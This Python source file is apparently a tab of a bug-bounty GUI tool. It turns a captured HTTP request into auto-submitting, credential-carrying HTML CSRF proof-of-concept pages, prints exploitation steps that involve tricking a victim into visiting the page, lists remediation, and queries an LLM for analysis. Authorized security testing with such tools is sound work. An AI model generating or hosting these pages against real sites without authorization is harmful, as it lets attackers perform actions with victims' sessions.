# ============================================================================
# Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
# Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
#
# Unauthorized copying, distribution, or modification of this software,
# via any medium, is strictly prohibited without written permission.
#
# Licensed users may use this software under the terms of their license.
# For licensing: https://github.com/Mrsultan7890/osints
# ============================================================================

"""
CSRF PoC Generator Tab
======================
Selected request se auto HTML CSRF PoC generate karo.
Burp Suite Pro CSRF PoC Generator ka full alternative.

Features:
  - GET / POST / multipart form PoC
  - Auto-detect CSRF tokens in request
  - AI analysis: is CSRF actually exploitable?
  - One-click copy / save HTML
  - Built-in preview (text render)
  - SameSite / CORS check
"""

import tkinter as tk
from tkinter import ttk, messagebox
import json
import threading
import urllib.parse
import time
import logging
from datetime import datetime

logger = logging.getLogger(__name__)


class CSRFTab:
    """
    Tab: CSRF PoC Generator.
    Generates ready-to-use HTML CSRF proof-of-concept pages.
    """

    def __init__(self, notebook, app):
        self.app      = app
        self.db       = app.db
        self._poc_html = ''

        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text='⚡ CSRF PoC')
        self._build()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build(self):
        from sentinel_proxy.ui.app import (
            BG, BG2, BG3, BG4, BORDER2, ACCENT, ACCENT3,
            TEXT, TEXT2, TEXT3, GREEN, RED, ORANGE, YELLOW, CYAN,
            FONT_MONO, FONT_MONO_SM, FONT_MONO_XS
        )
        C = self._C = dict(
            BG=BG, BG2=BG2, BG3=BG3, BG4=BG4, BORDER2=BORDER2,
            ACCENT=ACCENT, ACCENT3=ACCENT3, TEXT=TEXT, TEXT2=TEXT2,
            TEXT3=TEXT3, GREEN=GREEN, RED=RED, ORANGE=ORANGE,
            YELLOW=YELLOW, CYAN=CYAN,
        )

        # ── Toolbar ───────────────────────────────────────────────────────────
        tb = tk.Frame(self.frame, bg=C['BG3'])
        tb.pack(fill='x')

        ttk.Button(tb, text='▶  GENERATE PoC', style='Cyan.TButton',
            command=self._generate).pack(side='left', padx=8, pady=6)
        ttk.Button(tb, text='FROM PROXY SELECTION', style='Ghost.TButton',
            command=self._from_proxy).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='AI ANALYSIS', style='Ghost.TButton',
            command=self._ai_analyze).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='COPY HTML', style='Green.TButton',
            command=self._copy_html).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='SAVE HTML', style='Ghost.TButton',
            command=self._save_html).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='OPEN IN BROWSER', style='Ghost.TButton',
            command=self._open_browser).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='CLEAR', style='Ghost.TButton',
            command=self._clear).pack(side='left', padx=4, pady=6)

        self._status_lbl = tk.Label(tb, text='',
            bg=C['BG3'], fg=C['TEXT2'], font=FONT_MONO_XS)
        self._status_lbl.pack(side='right', padx=12)

        # ── Request input ─────────────────────────────────────────────────────
        cfg = tk.Frame(self.frame, bg=C['BG3'])
        cfg.pack(fill='x')

        inner = tk.Frame(cfg, bg=C['BG3'])
        inner.pack(padx=10, pady=6, fill='x')

        r1 = tk.Frame(inner, bg=C['BG3'])
        r1.pack(fill='x', pady=2)
        self._lbl(r1, 'TARGET URL')
        self._url_entry = ttk.Entry(r1, width=50, font=FONT_MONO)
        self._url_entry.pack(side='left', padx=(0, 12))
        self._lbl(r1, 'METHOD')
        self._method_var = ttk.Combobox(r1, width=8, state='readonly',
            values=['POST', 'GET', 'PUT', 'DELETE', 'PATCH'])
        self._method_var.set('POST')
        self._method_var.pack(side='left', padx=(0, 12))
        self._lbl(r1, 'ENCODING')
        self._enc_var = ttk.Combobox(r1, width=22, state='readonly',
            values=['application/x-www-form-urlencoded',
                    'multipart/form-data', 'application/json',
                    'text/plain'])
        self._enc_var.set('application/x-www-form-urlencoded')
        self._enc_var.pack(side='left')

        r2 = tk.Frame(inner, bg=C['BG3'])
        r2.pack(fill='x', pady=2)
        self._lbl(r2, 'PARAMETERS  (name=value, one per line)')
        self._auto_submit_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(r2, text='Auto-submit on load',
            variable=self._auto_submit_var).pack(side='right', padx=8)
        self._include_creds_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(r2, text='Include credentials',
            variable=self._include_creds_var).pack(side='right', padx=8)

        self._params_txt = tk.Text(inner, bg=C['BG4'], fg=C['TEXT'],
            font=('Fira Code', 9), relief='flat', borderwidth=1,
            height=5, padx=8, pady=6,
            insertbackground=C['ACCENT'])
        self._params_txt.pack(fill='x', pady=(4, 0))

        # ── Main split ────────────────────────────────────────────────────────
        pw = ttk.PanedWindow(self.frame, orient='horizontal')
        pw.pack(fill='both', expand=True)

        # Left: HTML PoC
        lf = tk.Frame(pw, bg=C['BG'])
        pw.add(lf, weight=2)

        lh = tk.Frame(lf, bg=C['BG3'])
        lh.pack(fill='x')
        tk.Frame(lh, bg=C['ACCENT'], width=3).pack(side='left', fill='y')
        tk.Label(lh, text='  HTML PoC', bg=C['BG3'], fg=C['ACCENT'],
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        poc_f = tk.Frame(lf, bg=C['BG'])
        poc_f.pack(fill='both', expand=True)
        self._poc_txt = tk.Text(poc_f, bg=C['BG2'], fg=C['GREEN'],
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='none', padx=10, pady=8)
        vs = ttk.Scrollbar(poc_f, orient='vertical', command=self._poc_txt.yview)
        hs = ttk.Scrollbar(poc_f, orient='horizontal', command=self._poc_txt.xview)
        self._poc_txt.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        vs.pack(side='right', fill='y')
        hs.pack(side='bottom', fill='x')
        self._poc_txt.pack(fill='both', expand=True)

        # Right: analysis
        rf = tk.Frame(pw, bg=C['BG'])
        pw.add(rf, weight=1)

        rh = tk.Frame(rf, bg=C['BG3'])
        rh.pack(fill='x')
        tk.Frame(rh, bg=C['ACCENT'], width=3).pack(side='left', fill='y')
        tk.Label(rh, text='  CSRF ANALYSIS', bg=C['BG3'], fg=C['TEXT2'],
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        analysis_f = tk.Frame(rf, bg=C['BG'])
        analysis_f.pack(fill='both', expand=True)
        self._analysis_txt = tk.Text(analysis_f, bg=C['BG2'], fg=C['CYAN'],
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='word', padx=10, pady=8)
        vs2 = ttk.Scrollbar(analysis_f, orient='vertical',
                             command=self._analysis_txt.yview)
        self._analysis_txt.configure(yscrollcommand=vs2.set)
        vs2.pack(side='right', fill='y')
        self._analysis_txt.pack(fill='both', expand=True)

    def _lbl(self, parent, text):
        from sentinel_proxy.ui.app import FONT_MONO_XS, BG3, TEXT2
        tk.Label(parent, text=text, bg=BG3, fg=TEXT2,
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=(0, 5))

    # ── Core ──────────────────────────────────────────────────────────────────

    def _generate(self):
        url    = self._url_entry.get().strip()
        method = self._method_var.get()
        enc    = self._enc_var.get()
        if not url:
            messagebox.showwarning('CSRF PoC', 'Enter a target URL')
            return
        if not url.startswith('http'):
            url = 'http://' + url
            self._url_entry.delete(0, 'end')
            self._url_entry.insert(0, url)

        # Parse params
        params = {}
        for line in self._params_txt.get('1.0', 'end').strip().split('\n'):
            line = line.strip()
            if '=' in line:
                k, _, v = line.partition('=')
                params[k.strip()] = v.strip()

        auto_submit  = self._auto_submit_var.get()
        include_creds = self._include_creds_var.get()

        html = self._build_poc(url, method, enc, params, auto_submit, include_creds)
        self._poc_html = html
        self._poc_txt.delete('1.0', 'end')
        self._poc_txt.insert('1.0', html)

        # Quick analysis
        self._run_analysis(url, method, params, {})
        self._status_lbl.config(text='PoC generated', fg=self._C['GREEN'])

    def _build_poc(self, url: str, method: str, enc: str,
                   params: dict, auto_submit: bool, include_creds: bool) -> str:
        creds_attr = 'credentials="include"' if include_creds else ''

        if enc == 'application/json':
            body_json = json.dumps(params, indent=2)
            submit_js = (
                'fetch(form.action, {'
                f'method: "{method}", '
                f'headers: {{"Content-Type": "application/json"}}, '
                f'{creds_attr}, '
                f'body: JSON.stringify({json.dumps(params)})'
                '});'
            )
            auto_js = f'<script>window.onload = function(){{ {submit_js} }}</script>' if auto_submit else ''
            return (
                f'<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC</title></head>\n<body>\n'
                f'<h2>CSRF PoC — JSON body</h2>\n'
                f'<p>Target: <code>{url}</code></p>\n'
                f'<button onclick=\'{submit_js}\'>Submit</button>\n'
                f'{auto_js}\n</body>\n</html>'
            )

        if enc == 'multipart/form-data':
            inputs = '\n'.join(
                f'  <input type="hidden" name="{k}" value="{v}" />'
                for k, v in params.items()
            )
            auto_js = ('<script>document.getElementById("csrf-form").submit();</script>'
                       if auto_submit else '')
            return (
                f'<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC</title></head>\n<body>\n'
                f'<form id="csrf-form" action="{url}" method="{method}" '
                f'enctype="multipart/form-data">\n{inputs}\n'
                f'  <input type="submit" value="Submit" />\n</form>\n'
                f'{auto_js}\n</body>\n</html>'
            )

        # Default: application/x-www-form-urlencoded
        inputs = '\n'.join(
            f'  <input type="hidden" name="{k}" value="{v}" />'
            for k, v in params.items()
        )
        auto_js = ('<script>document.getElementById("csrf-form").submit();</script>'
                   if auto_submit else '')
        return (
            f'<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC — SentinelProxy</title></head>\n'
            f'<body>\n'
            f'<h2>CSRF Proof of Concept</h2>\n'
            f'<p>Target: <code>{url}</code></p>\n'
            f'<form id="csrf-form" action="{url}" method="{method}">\n'
            f'{inputs}\n'
            f'  <input type="submit" value="Submit Request" />\n'
            f'</form>\n'
            f'{auto_js}\n'
            f'</body>\n</html>'
        )

    def _run_analysis(self, url: str, method: str, params: dict, headers: dict):
        self._analysis_txt.delete('1.0', 'end')
        out = f'{"="*45}\n  CSRF VULNERABILITY ANALYSIS\n{"="*45}\n\n'
        out += f'URL    : {url}\nMethod : {method}\n\n'

        # Check for CSRF tokens in params
        csrf_keys = [k for k in params
                     if any(t in k.lower() for t in
                            ['csrf', 'token', '_token', 'nonce', 'authenticity'])]
        enc = self._enc_var.get()
        is_json_api = enc == 'application/json'

        if csrf_keys:
            out += f'[MEDIUM] CSRF token found in params: {", ".join(csrf_keys)}\n'
            out += '         Verify if token is properly validated server-side.\n\n'
        elif is_json_api:
            out += '[LOW]    JSON API endpoint — CSRF risk is lower.\n'
            out += '         Custom Content-Type header acts as implicit CSRF protection.\n'
            out += '         However, verify CORS policy is restrictive.\n\n'
        else:
            out += '[HIGH]   No CSRF token detected in parameters.\n'
            out += '         Request may be vulnerable to CSRF.\n\n'

        # Check SameSite
        out += '── Cookie / SameSite Check ──\n'
        out += ('Run the PoC from a different origin to confirm.\n'
                'If request succeeds → CSRF confirmed.\n\n')

        # Check method
        if method == 'GET':
            out += '[HIGH]   GET request with state change — trivially exploitable.\n\n'
        elif method == 'POST':
            out += '[INFO]   POST request — requires form-based PoC (generated above).\n\n'

        out += '── Exploitation Steps ──\n'
        out += ('1. Host the HTML PoC on attacker server\n'
                '2. Trick victim into visiting the page\n'
                '3. Browser auto-submits form with victim cookies\n'
                '4. Server processes request as victim\n\n')
        out += '── Remediation ──\n'
        out += ('• Implement CSRF tokens (synchronizer token pattern)\n'
                '• Use SameSite=Strict or SameSite=Lax cookies\n'
                '• Verify Origin/Referer headers\n'
                '• Use custom request headers for AJAX\n')

        self._analysis_txt.insert('1.0', out)

    def _from_proxy(self):
        req_id = getattr(self.app, 'selected_req', None)
        if not req_id:
            messagebox.showwarning('CSRF PoC', 'Select a request in Proxy tab first')
            return
        req = self.db.get_request(req_id)
        if not req:
            return

        self._url_entry.delete(0, 'end')
        self._url_entry.insert(0, req.get('url', ''))
        self._method_var.set(req.get('method', 'POST'))

        # Parse params from body + query
        params = {}
        try:
            params.update(json.loads(req.get('params', '{}')))
        except Exception:
            pass
        body = req.get('body', '')
        if body and '=' in body:
            for part in body.split('&'):
                if '=' in part:
                    k, _, v = part.partition('=')
                    params[k.strip()] = urllib.parse.unquote(v.strip())

        self._params_txt.delete('1.0', 'end')
        for k, v in params.items():
            self._params_txt.insert('end', f'{k}={v}\n')

        # Detect content type
        try:
            hdrs = json.loads(req.get('headers', '{}'))
            ct   = hdrs.get('Content-Type', hdrs.get('content-type', ''))
            if ct:
                for enc in ['application/json', 'multipart/form-data',
                            'application/x-www-form-urlencoded']:
                    if enc in ct:
                        self._enc_var.set(enc)
                        break
        except Exception:
            pass

        self.app._set_status('Request loaded into CSRF PoC Generator')
        self._generate()

    def _ai_analyze(self):
        if not self._poc_html:
            messagebox.showwarning('CSRF PoC', 'Generate PoC first')
            return
        url    = self._url_entry.get().strip()
        method = self._method_var.get()
        params_raw = self._params_txt.get('1.0', 'end').strip()

        def _run():
            try:
                analyzer = self.app.analyzer
                if not hasattr(analyzer, '_groq') or not analyzer._groq:
                    self.app.root.after(0, lambda: self._analysis_txt.insert(
                        'end', '\n[Groq not available]\n'))
                    return
                prompt = (
                    f"Analyze this HTTP request for CSRF vulnerability:\n"
                    f"URL: {url}\nMethod: {method}\nParams:\n{params_raw}\n\n"
                    f"Answer:\n"
                    f"1. Is this request CSRF-vulnerable? (YES/NO + reason)\n"
                    f"2. What is the impact if exploited?\n"
                    f"3. Are there any CSRF mitigations present?\n"
                    f"4. Specific remediation steps.\n"
                    f"Be concise and technical."
                )
                result = analyzer._groq.ask(prompt, max_tokens=400)
                self.app.root.after(0, lambda r=result: [
                    self._analysis_txt.insert('end',
                        f'\n{"="*45}\n  GROQ AI ANALYSIS\n{"="*45}\n\n{r}\n'),
                    self._status_lbl.config(text='AI analysis done', fg=self._C['GREEN'])
                ])
            except Exception as e:
                self.app.root.after(0, lambda: self._status_lbl.config(
                    text=f'AI error: {str(e)[:50]}', fg=self._C['RED']))

        self._status_lbl.config(text='Running AI analysis...', fg=self._C['YELLOW'])
        threading.Thread(target=_run, daemon=True).start()

    def _copy_html(self):
        if not self._poc_html:
            messagebox.showwarning('CSRF PoC', 'Generate PoC first')
            return
        self.app.root.clipboard_clear()
        self.app.root.clipboard_append(self._poc_html)
        self.app._set_status('CSRF PoC HTML copied to clipboard')

    def _save_html(self):
        if not self._poc_html:
            messagebox.showwarning('CSRF PoC', 'Generate PoC first')
            return
        from tkinter import filedialog
        path = filedialog.asksaveasfilename(
            defaultextension='.html',
            filetypes=[('HTML', '*.html'), ('All', '*.*')],
            initialfile=f'csrf_poc_{int(time.time())}.html')
        if not path:
            return
        with open(path, 'w') as f:
            f.write(self._poc_html)
        self.app._set_status(f'CSRF PoC saved: {path}')
        messagebox.showinfo('Saved', f'PoC saved:\n{path}')

    def _open_browser(self):
        if not self._poc_html:
            messagebox.showwarning('CSRF PoC', 'Generate PoC first')
            return
        import tempfile, subprocess
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False,
                                         mode='w') as f:
            f.write(self._poc_html)
            tmp = f.name
        subprocess.Popen(['xdg-open', tmp])
        self.app._set_status(f'PoC opened in browser: {tmp}')

    def _clear(self):
        self._poc_html = ''
        self._poc_txt.delete('1.0', 'end')
        self._analysis_txt.delete('1.0', 'end')
        self._params_txt.delete('1.0', 'end')
        self._url_entry.delete(0, 'end')
        self._status_lbl.config(text='')
